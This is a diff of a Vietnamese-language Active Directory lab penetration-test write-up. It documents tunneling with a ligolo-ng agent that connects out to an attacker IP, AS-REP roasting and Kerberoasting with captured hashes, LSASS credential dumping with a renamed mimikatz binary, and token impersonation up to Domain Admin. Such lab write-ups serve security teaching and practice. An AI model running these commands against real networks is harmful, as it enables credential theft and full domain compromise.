@@ -4,8 +4,8 @@
 
 
 ## System information
-- Subnet: 192.168.198.0 /24
-- Gateway/DNS (DC): 192.168.198.10
+- Subnet: 10.0.0.0 /24
+- Gateway/DNS (DC): 10.0.0.10
 - Machines:
     - Linux Server (Public facing):
         - OS: Ubuntu 18.04
@@ -30,8 +30,8 @@
 # Initial access
 Initial access into public facing
 ```bash
-ssh root@192.168.198.149
-root@192.168.198.149's password:
+ssh root@192.168.198.151
+root@192.168.198.151's password:
 Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-60-generic x86_64)
 ```
 
@@ -103,7 +103,7 @@ Setup Attacker Proxy & TUN Interface:
 
 Deploy and Run Agent on Victim:
 ```bash
-❯ ./agent -connect <attacker_ip>:11601 -ignore-cert
+❯ ./agent -connect 172.21.154.241:11601 -ignore-cert
 ```
 
 Start Tunnel and Add Route:
@@ -111,7 +111,7 @@ Start Tunnel and Add Route:
 # Back on attacker's ligolo-ng proxy interface
 » session
 [+] Sessions
- 0: pumpkin@WebServer (192.168.198.149) - Connected
+ 0: pumpkin@WebServer (192.168.198.151) - Connected
 » use 0
 » start
 
@@ -387,7 +387,7 @@ Add domain resolution into `/etc/hosts`
 # Auth as `dev01`
 ## Get password hash:
 ### AS-Rep Roasting:
-We can use the `netexec` or `impacket-GetNPUsers` to perform AS-Rep Roasting attack
+Khi có danh sách các user, ta sẽ nghĩ ngay đến việc tìm những users bị misconfig `DONT_REQUIRE_PREAUTH`, sau đấy sẽ thu hash và crack nó ra. Ta có thể sử dụng  `impacket-GetNPUsers` để thực hiện tấn công AS-Rep Roasting
 ```bash
 ❯ GetNPUsers.py vdt.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash -no-pass    
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -397,8 +397,22 @@ $krb5asrep$23$dev01@VDT.LOCAL:925daa79d3aa8caae68b7267469234ae$04b7b0f794f651fa1
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ...SNIP...
 ```
+Tương tự, ta có thể sử dụng `netexec` để tấn công AS-REP roasting:
+```bash
+❯ nxc ldap 10.0.0.10 -u users.txt -p '' --asreproast asrephashes.txt                               · 17/06/25 15:21
+LDAP        10.0.0.10       389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:vdt.local) (signing:None) (channel binding:Never)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+LDAP        10.0.0.10       389    DC01             $krb5asrep$23$dev01@VDT.LOCAL:59eeaa2bd46412865181379d9376ad92$292148b7ec88a2d59413591eb1600b91b8db1cd289591a23976da3cae42d558385438aba02c36083baf8c85a1eb1c9ccabd5e4c6026316534fbac3d1324f7fcb698d49100dac29cd556baf45d7bc4ff1fd1d8380a82832afa7603f6ff9fc23407992ea20efde5a21170f6935955731f8579911d9b403512fc86273cb92b918d44829d4653bafbab4603267ab64322e2b95ea68cc908233939b1ae4f3de970c6c2051bf48f2266050f794ce5e572a8943973aa00129882fb12cf72c4021468041722075704e600cfb2a830f36643e5754a204ce2d835b37fc40fdbb176b2dbff35cc1ecf8b811
+
+```
 
 ### Kerberoasting
+- Thông thường ta được biết rằng là Kerberoasting cần có được tài khoản có quyền truy cập vào domain thì mới dump được hash của các tài khoản có SPN hợp lệ trong admin. Tuy nhiên, việc tìm ra được các tài khoản có bật flag `DONT_REQUIRE_PREAUTH` đưa ra cho ta 2 hướng tấn công mới mà không cần tài khoản join domain:
+	- Kerberoasting không cần pre-auth: ta có thể lợi dụng tài khoản có flag `DONT_REQUIRE_PREAUTH` (ở đây là `dev01`) để Kerberoast các SPN khác. Bằng cách gửi AS-REQ cho `dev01`, nhưng đặt SPN của một tài khoản dịch vụ khác (ví dụ: `MSSQLSvc/db.vdt.local` hoặc SPN của `dev01`) vào trường `sname`. KDC sẽ trả về ST cho tài khoản dịch vụ đó, được mã hóa bằng hash của tài khoản dịch vụ. Điều kiện là biết username của tài khoản `DONT_REQUIRE_PREAUTH` và username của tài khoản SPN mục tiêu.
+	- Roast in the middle: Kẻ tấn công Man-in-the-Middle có thể chặn bất kỳ AS-REQ nào, sửa trường `sname` thành SPN mục tiêu và gửi lại KDC để lấy ST và crack hash. Điều này khả thi vì `req-body` của AS-REQ không được bảo vệ bằng checksum
+
+- Ta sẽ sử dụng công cụ `impacket-GetUserSPNs.py` để khai thác Kerberoasting unauth. Lệnh này lợi dụng cờ DONT_REQ_PREAUTH trên dev01 để lấy một TGT mà không cần mật khẩu. Sau đó, nó sử dụng TGT này để thực hiện một cuộc tấn công Kerberoasting đối với các SPN được liệt kê.
 ```bash
 ❯ GetUserSPNs.py -no-preauth dev01 -usersfile users.txt vdt.local/ | grep '^\$krb' > kerberoasting_hashes
 
@@ -668,11 +682,11 @@ meterpreter >
 ## Credential dumping
 ### `LSASS.exe`
 #### `mimikatz`
-- `LSASS.exe` là một tiến trình quan trọng trong Window, nó lưu trữ các thông tin xác thực của người dùng đã đăng nhập (VD: NTLM hash, Kerberos và đôi khi cả mật khẩu dạng plaintext nếu cấu hình cho phép như `WDigest`)
+- `LSASS.exe` là một tiến trình quan trọng trong Window, nó lưu trữ các thông tin xác thực của người dùng đã đăng nhập. VD: NTLM hash, Kerberos và đôi khi cả mật khẩu dạng plaintext nếu cấu hình cho phép như `WDigest`. Tuy nhiên, mật khẩu plaintext có thể xuất hiện ngay cả khi WDigest đã bị vô hiệu hóa trên các hệ điều hành mới hơn. Đôi khi, các ứng dụng hoặc cấu hình cũ (như yêu cầu "Connect as..." với tùy chọn lưu mật khẩu) có thể khiến LSASS vẫn lưu trữ mật khẩu plaintext. Ngoài ra, việc bật "Restricted Admin Mode" cho RDP cũng là một cách phòng chống việc lộ mật khẩu plaintext.
 - Ta sẽ tiến hành dump `LSASS.exe` bằng công cụ `mimikatz` (đây là công cụ tích hợp nhiều chức năng cho phép dump các thông tin quan trọng như mật khẩu ở trong bộ nhớ, NTLM hash, Kerberos ticket, ...) 
 - Sử dụng `mimikatz` với module `sekurlsa::logonpasswords` để trích xuất tất cả các thông tin đăng nhập (hash, vé, mật khẩu cleartext nếu có) của tất cả người dùng đang đăng nhập hoặc đã đăng nhập gần đây từ bộ nhớ LSASS. 
 ```bash
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > C:\Windows\Temp\lsass.txt 
+.\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit > C:\Windows\Temp\lsass.txt 
 type C:\Windows\Temp\lsass.txt
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -852,7 +866,7 @@ root flag he. he. he. he.
 
 #### `incognito`
 - Ngoài những credential hash được lưu trữ trong logon session thì `LSASS.exe` còn lưu trữ access token, đây là trái tim của cơ chế Single Sign on trong Windows. Chứa thông tin về danh tính và quyền của user tạo ra sau khi user login thành công. Khi user thực thi một chương trình, một bản copy của access token được tạo ra và chương trình sẽ chạy dưới quyền của người đấy
-- Cơ chế của `incognito` là dùng Windows API để copy access token và gán vào một process/thread khác. Nếu process/thread đó được tạo bởi một ông Domain Admin, ta sẽ sử dụng công cụ này để steal token còn tồn tại trong tiến trình và có thể leo quyền domain
+- Cơ chế của `incognito` là dùng Windows API để copy access token và gán vào một process/thread khác. Nếu process/thread đó được tạo bởi một Domain Admin, ta sẽ sử dụng công cụ này để steal token còn tồn tại trong tiến trình và có thể leo quyền domain
 - Shell `meterpreter` trên `metasploit` có hỗ trợ module `incognito`. Vì thế, ta sẽ thiết lập lại shell `meterpreter` 
 - Load module `incognito`. Sau khi ta tìm trong danh sách các token, may mắn là có user VDT\Administrator thuộc Domain Admins. Điều này có thể là do admin này đã đăng nhặp vào `WS01` (có thể là RDP, SMB, ...)
 ```bash
@@ -871,8 +885,10 @@ Impersonation Tokens Available
 ========================================
 No tokens available
 ```
-
-- Thực hiện đánh cắp token và leo lên Domain Admins
+- Ở đây ta thấy có 2 loại tokens đó chính là delegation token và impersonate token:
+    - Delegation Token: Là token được tạo khi một người dùng đăng nhập tương tác (interactive logon) hoặc qua RDP. Token này mạnh hơn, cho phép attacker xác thực với các tài nguyên mạng khác (ví dụ: truy cập \\DC01\C$).
+    - Impersonation Token: Là token được tạo khi một người dùng xác thực với một dịch vụ trên máy chủ (ví dụ: kết nối SMB đến một share). Token này thường yếu hơn và chỉ cho phép thực hiện các hành động cục bộ trên máy đó, không thể dùng để xác thực ra ngoài mạng.
+- May mắn là token của Administrator là một Delegation Token, cho phép chúng ta không chỉ có quyền trên máy WS01 mà còn có thể sử dụng danh tính này để truy cập các tài nguyên mạng khác, như DC. Cuối cùng, thực hiện đánh cắp token và leo lên Domain Admins
 ```bash
 meterpreter > impersonate_token "VDT\\Administrator"
 [+] Delegation token available
